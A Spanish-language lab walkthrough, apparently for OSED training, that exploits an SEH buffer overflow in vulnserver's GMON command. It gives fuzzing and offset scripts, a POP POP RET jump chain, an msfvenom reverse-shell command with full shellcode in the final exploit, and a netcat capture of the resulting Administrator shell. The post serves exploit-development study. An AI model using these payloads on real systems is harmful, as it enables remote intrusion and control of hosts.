---
layout: post
title: VulnServer - GMON
description: VulnServer - GMON
tags: [BoF,osed,exploiting]
---

La vulnerabilidad que intentaremos explotar es un desbordamiento de buffer basado en SEH en el párametro `GMON` de `vulnserver`.

> **¿Qué es un Controlador de Excepciones Estructurado?**
> Un manejador de excepciones es una instrucción de programación que se utiliza para proporcionar una forma estructurada de manejar condiciones de error a nivel de sistema y aplicación

Un ejemplo de una llamada al controlador de excepciones en Windows es cuando una aplicación muestra un mensaje de error similar a la siguiente imágen:

![error](/assets/imgs/gmon/error.png)

**Estructura SEH:** también llamado registro SEH tiene **8 bytes** y 2 elementos (4 bytes).

----

## Requisitos

- Sistema Windows 32 bits: (en mi caso hago uso de un Windows XP)
- Aplicación vulnerable: vulnserver
- Inmunity Debugger

----

## Fuzzing

Para este paso he creado un script que mediante un bucle while incrementará en 200 bytes (caracteres "A") por cada iteración hasta que ocurra un desbordamiento en la memoria.

```
#!/usr/bin/python
import socket, sys
from time import sleep

buffer = "A" * 200

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.105',9999))
        s.recv(1024)

        print '[*] Enviando buffer con longitud: ' + str(len(buffer))
        s.send("GMON /.:/" + buffer)
        s.close()
        sleep(1)
        buffer=buffer+'A'* 200

    except Exception as e:
        print str(e)
        sys.exit()
```

Ejecuto el fuzzer y vemos que crashea a los 4000 bytes enviados.  
Se puede ver como el registro `EIP` se sobreescribe.

```
❯ python FUZZ.py
[*] Enviando buffer con longitud: 200
[*] Enviando buffer con longitud: 400
[*] Enviando buffer con longitud: 600
[*] Enviando buffer con longitud: 800
[*] Enviando buffer con longitud: 1000
[*] Enviando buffer con longitud: 1200
[*] Enviando buffer con longitud: 1400
[*] Enviando buffer con longitud: 1600
[*] Enviando buffer con longitud: 1800
[*] Enviando buffer con longitud: 2000
[*] Enviando buffer con longitud: 2200
[*] Enviando buffer con longitud: 2400
[*] Enviando buffer con longitud: 2600
[*] Enviando buffer con longitud: 2800
[*] Enviando buffer con longitud: 3000
[*] Enviando buffer con longitud: 3200
[*] Enviando buffer con longitud: 3400
[*] Enviando buffer con longitud: 3600
[*] Enviando buffer con longitud: 3800
[*] Enviando buffer con longitud: 4000
timed out
```

![reg](/assets/imgs/gmon/reg.png)

No se visualiza de forma representativa, esto se debe a que una vez que llega a `EIP` el programa se detiene en ese instante y no llega a tocar la excepción, pero podemos ver en la parte del stack(parte inferior derecha de InmunityDebugger) cuando llega a sobreescribir el valor de SEH.

![pila](/assets/imgs/gmon/pila.png)

En el caso de enviar los 4000 bytes de golpe por así decirlo vemos como `EIP` no se sobreescribe.

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

payload = b""
payload += b"GMON /"
payload += b"A"*4000

r.sendline(payload)
r.close()
```

![eip2](/assets/imgs/gmon/eip2.png)

Revisamos el visor de cadena `SEH`, y tanos los valores de `SEH` como `NSEH` se han sobreescrito.

> Para visualizar las SEH damos click en `view -> SEH chain` de la barra de opciones del programa.

![seh](/assets/imgs/gmon/seh.png)

----

## Buscando dirección SEH NSEH

A través de `pattern_create` creamos un patron que permitirá obtener la dirección exacta de `SEH` y `NSEH`.

```
❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 4000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3[...]
```

Modifico la carga del script, quedando de la siguiente manera:

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

pattern=b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"

payload = b""
payload += b"GMON /.:/"
payload += pattern

r.sendline(payload)
r.close()
```

El envio de esta carga nos da el patrón único que ha sobreescrito el valor `SEH` y `NSEH`

![seh2](/assets/imgs/gmon/seh2.png)

```
❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 45356d45
[*] Exact match at offset 3495
❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 6d45366d
[*] Exact match at offset 3499
```

- Desplazamiento para sobreescribir **SEH** : 3499
- Desplazamiento para sobreescribir **NSEH**: 3495

Para corroborar esto sustituiré `NSEH` por `BBBB` y `SEH` por `CCCC`.  
Quedando en script PoC de la siguiente forma:

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

NSEH = b"BBBB"
SEH  = b"CCCC"

payload = b""
payload += b"GMON /.:/"
payload += b"A"*3495
payload += NSEH
payload += SEH
payload += b"D"*(5000-len(payload))

r.sendline(payload)
r.close()
```

![seh3](/assets/imgs/gmon/seh3.png)

Visualización desde el volcado hexadecimal del ejecutable

![dump](/assets/imgs/gmon/dump.png)

Visualización desde la pila

![pila2](/assets/imgs/gmon/pila2.png)

----

## Comprobación de badchars

Para buscar badchars que puedan corromper nuestro exploit haremos una verificación de malos caracteres. Introduciremos dentro del área del buffer de las `As`

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

badchars= b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars+=b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars+=b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars+=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars+=b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars+=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars+=b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars+=b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars+=b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars+=b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars+=b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars+=b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars+=b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars+=b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars+=b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


NSEH = b"BBBB"
SEH  = b"CCCC"

payload = b""
payload += b"GMON /.:/"
payload += b"A"*(3495-len(badchars))
payload += badchars
payload += NSEH
payload += SEH
payload += b"D"*(5000-len(payload))

r.sendline(payload)
r.close()
```

Podemos ver que todos los caracteres se interpretan

![bad](/assets/imgs/gmon/bad.png)

----

## POP POP RET

`!mona seh -n`: Desapilamiento de 8 bytes con POP POP RET, elije una dirección de la mejor DLL con menos seguridad.

![pop](/assets/imgs/gmon/pop.png)

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

NSEH = b"BBBB"
SEH  = p32(0x625010b4)

payload = b""
payload += b"GMON /.:/"
payload += b"A"*3495
payload += NSEH
payload += SEH
payload += b"D"*(5000-len(payload))

r.sendline(payload)
r.close()
```

![seh4](/assets/imgs/gmon/seh4.png)


![poppopret](/assets/imgs/gmon/poppopret.png)

----

## Salto corto

La idea de hacer un salto para alcanzar los valores de `C` en la pila es obtener espacio para trabajar, aunque todavía no es posiblecolocar nuestro shellcode, por tanto lo usaremos para volver a subir a la pila donde se encuentra el relleno de `A's` y es ahí donde agregaremos nuestro código de shell.

Para desplazarnos desde donde nos encontramos (dirección `00B7FFDC`) podemos realizar un salto corto (short JMP `EB`) y luego darle el valor `06` para avanzar 6 bytes hacia abajo de la pila.

![update](/assets/imgs/gmon/update.png)

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

NSEH = b"\xeb\x06\x90\x90"
SEH  = p32(0x625010b4)

payload = b""
payload += b"GMON /.:/"
payload += b"A"*3495
payload += NSEH
payload += SEH
payload += b"D"*(5000-len(payload))

r.sendline(payload)
r.close()
```

Instrucción de salto

![jmp](/assets/imgs/gmon/jmp.png)

Salto de 6 bytes

![jmp2](/assets/imgs/gmon/jmp2.png)

Una vez que aterrizamos en el buffer `C`, elregistro `ESP` apunta a `00B7EE50`. Ahora para averiguar el desplazamiento desde `ESP` hasta el principio del buffer `A` usaré el script [Offset.py](https://github.com/h0mbre/Offset)

Incio de buffer C's    -> ESP 00b7ee51
Incio de buffer A's    ->     00b7f235

```
❯ python offset.py
Enter Address #1: 00b7ee50
Enter Address #2: 00b7f235
[+] Hex offset: 0x3e5
[+] Decimal offset: 997
```

El resultado nos dice que `ESP` (ubicación actual) está a 997 bytes por debajo del comienzo de nuestro buffer `A`.

Obteniendo los codigos de operación

- Prmiero empujamos `ESP`
- Luego metemos `EAX`
- A continuación añadimos 0x3e5 a `EAX`
- Por último un salto a `EAX`

```
nasm> push esp
54                       push esp
nasm> pop eax
58                       pop eax
nasm> add eax, 0x3e5
05E5030000               add eax,0x3e5
nasm> add ax, 0x3e5
6605E503                 add ax,0x3e5
nasm> jmp eax
FFE0                     jmp eax
```

jumpback => `\x54\x50\x66\x05\xe4\x03\xff\xe0`

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

NSEH = p32(0x909006eb)
SEH  = p32(0x625010b4)
jumpback = b"\x54\x58\x66\x05\xe5\x03\xff\xe0"

payload = b""
payload += b"GMON /.:/"
payload += b"A"*3495
payload += NSEH
payload += SEH
payload += jumpback
payload += b"C"*(5000-len(payload))

r.sendline(payload)
r.close()
```

Despues de ejecutar este script y recorrerlo, terminamos en la parte superior de nuestro buffer.

![sup](/assets/imgs/gmon/sup.png)

Todo lo que queda por hacer es agregar nuestro código de shell final a la parte superior de nuestro buffer `A`

----

## Shell Inversa

Creamos el shellcode con `msfvenom` para entablarnos una shell

```
❯ sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.107 lport=4444 -f python -b "\x00" EXITFUNC=thread
```

Script del exploit final

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

SEH  =  p32(0x625010b4)
NSEH = 	p32(0x909006eb)
junk = b"\x54\x58\x66\x05\xe5\x03\xff\xe0"

buf =  b""
buf += b"\xbe\x06\x35\xe6\xec\xda\xde\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x0e\x03\x75\x3b\x04"
buf += b"\x19\x85\xab\x4a\xe2\x75\x2c\x2b\x6a\x90\x1d\x6b\x08"
buf += b"\xd1\x0e\x5b\x5a\xb7\xa2\x10\x0e\x23\x30\x54\x87\x44"
buf += b"\xf1\xd3\xf1\x6b\x02\x4f\xc1\xea\x80\x92\x16\xcc\xb9"
buf += b"\x5c\x6b\x0d\xfd\x81\x86\x5f\x56\xcd\x35\x4f\xd3\x9b"
buf += b"\x85\xe4\xaf\x0a\x8e\x19\x67\x2c\xbf\x8c\xf3\x77\x1f"
buf += b"\x2f\xd7\x03\x16\x37\x34\x29\xe0\xcc\x8e\xc5\xf3\x04"
buf += b"\xdf\x26\x5f\x69\xef\xd4\xa1\xae\xc8\x06\xd4\xc6\x2a"
buf += b"\xba\xef\x1d\x50\x60\x65\x85\xf2\xe3\xdd\x61\x02\x27"
buf += b"\xbb\xe2\x08\x8c\xcf\xac\x0c\x13\x03\xc7\x29\x98\xa2"
buf += b"\x07\xb8\xda\x80\x83\xe0\xb9\xa9\x92\x4c\x6f\xd5\xc4"
buf += b"\x2e\xd0\x73\x8f\xc3\x05\x0e\xd2\x8b\xea\x23\xec\x4b"
buf += b"\x65\x33\x9f\x79\x2a\xef\x37\x32\xa3\x29\xc0\x35\x9e"
buf += b"\x8e\x5e\xc8\x21\xef\x77\x0f\x75\xbf\xef\xa6\xf6\x54"
buf += b"\xef\x47\x23\xfa\xbf\xe7\x9c\xbb\x6f\x48\x4d\x54\x65"
buf += b"\x47\xb2\x44\x86\x8d\xdb\xef\x7d\x46\x24\x47\x7d\xfd"
buf += b"\xcc\x9a\x7d\x10\x51\x12\x9b\x78\x79\x72\x34\x15\xe0"
buf += b"\xdf\xce\x84\xed\xf5\xab\x87\x66\xfa\x4c\x49\x8f\x77"
buf += b"\x5e\x3e\x7f\xc2\x3c\xe9\x80\xf8\x28\x75\x12\x67\xa8"
buf += b"\xf0\x0f\x30\xff\x55\xe1\x49\x95\x4b\x58\xe0\x8b\x91"
buf += b"\x3c\xcb\x0f\x4e\xfd\xd2\x8e\x03\xb9\xf0\x80\xdd\x42"
buf += b"\xbd\xf4\xb1\x14\x6b\xa2\x77\xcf\xdd\x1c\x2e\xbc\xb7"
buf += b"\xc8\xb7\x8e\x07\x8e\xb7\xda\xf1\x6e\x09\xb3\x47\x91"
buf += b"\xa6\x53\x40\xea\xda\xc3\xaf\x21\x5f\xe3\x4d\xe3\xaa"
buf += b"\x8c\xcb\x66\x17\xd1\xeb\x5d\x54\xec\x6f\x57\x25\x0b"
buf += b"\x6f\x12\x20\x57\x37\xcf\x58\xc8\xd2\xef\xcf\xe9\xf6"

payload = b""
payload += b"GMON /.:/"
payload += buf
payload += b"A"*(3495-len(buf))
payload += NSEH
payload += SEH
payload += junk
payload += b"C"*(5000-len(payload))

r.sendline(payload)
r.close()
```

Ejecuto el exploit y obtengo shell :)

```
❯ python3 exploit.py
[+] Opening connection to 192.168.0.105 on port 9999: Done
[*] Closed connection to 192.168.0.105 port 9999

───────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [192.168.0.105] 1050
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop\vulnerable-apps\vulnserver>whoami
whoami
ADVANCE-5583241\Administrator
```
